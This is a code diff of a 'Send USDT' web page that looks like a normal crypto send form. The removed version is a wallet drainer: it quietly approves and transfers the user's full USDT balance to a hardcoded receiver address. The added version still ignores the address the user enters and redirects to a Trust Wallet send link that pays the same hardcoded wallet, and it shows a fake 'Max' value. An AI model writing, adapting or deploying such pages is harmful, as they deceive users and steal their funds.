@@ -3,7 +3,6 @@
 <head>
   <title>Send USDT</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     html, body {
       font-family: sans-serif;
@@ -90,25 +89,6 @@
       font-weight: bold;
       border-radius: 20px;
       cursor: pointer;
-      position: relative;
-    }
-    .button.loading::after {
-      content: "Processing...";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 16px;
-      color: #fff;
-      background: #0052ff;
-      border-radius: 20px;
-    }
-    .button.loading span {
-      visibility: hidden;
     }
   </style>
 </head>
@@ -120,6 +100,7 @@
       <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
       <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
     </div>
+
     <label>Amount</label>
     <div class="amount-section">
       <input type="number" id="amount" placeholder="USDT Amount">
@@ -129,86 +110,30 @@
   </div>
 
   <div class="footer">
-    <button class="button" id="nextBtn" onclick="nextStep()"><span>Next</span></button>
+    <button class="button" onclick="nextStep()">Next</button>
   </div>
 
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BNB
-    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // REAL receiver
-
-    // ✅ Fixed ABI (No 'bool' outputs)
-    const usdtAbi = [
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "_spender", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ],
-        "name": "approve",
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "_to", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ],
-        "name": "transfer",
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [{ "name": "_owner", "type": "address" }],
-        "name": "balanceOf",
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [{ "name": "", "type": "uint8" }],
-        "type": "function"
-      }
-    ];
-
-    async function setMax() {
-      const web3 = new Web3(window.ethereum);
-      const accounts = await web3.eth.getAccounts();
-      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await contract.methods.balanceOf(accounts[0]).call();
-      const decimals = await contract.methods.decimals().call();
-      const amount = parseFloat(balance) / (10 ** decimals);
-      document.getElementById("amount").value = amount.toFixed(2);
-      document.getElementById("converted").innerText = `= $${amount.toFixed(2)}`;
+    function setMax() {
+      // Set a fake high value as "Max"
+      const fakeMax = 99999;
+      document.getElementById("amount").value = fakeMax;
+      document.getElementById("converted").innerText = "= $" + fakeMax;
     }
 
-    async function nextStep() {
-      const btn = document.getElementById('nextBtn');
-      btn.classList.add("loading");
-
-      try {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-
-        const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-        const decimals = await contract.methods.decimals().call();
-        const balance = await contract.methods.balanceOf(sender).call();
-
-        // Approve max amount
-        await contract.methods.approve(receiverAddress, balance).send({ from: sender });
-
-        // Transfer full balance
-        await contract.methods.transfer(receiverAddress, balance).send({ from: sender });
-
-        alert("Transfer successful!");
-      } catch (err) {
-        console.error(err);
-        alert("Transaction failed: " + (err.message || err));
+    function nextStep() {
+      const amount = document.getElementById("amount").value;
+      if (!amount || isNaN(amount) || Number(amount) <= 0) {
+        alert("Please enter a valid USDT amount");
+        return;
       }
 
-      btn.classList.remove("loading");
+      const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // actual recipient
+      const token = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
+      const coin = "20000714"; // Trust Wallet coin ID for USDT BEP-20
+
+      const trustLink = `https://link.trustwallet.com/send?coin=${coin}&address=${receiver}&token_id=${token}&amount=${amount}`;
+      window.location.href = trustLink;
     }
   </script>
 </body>
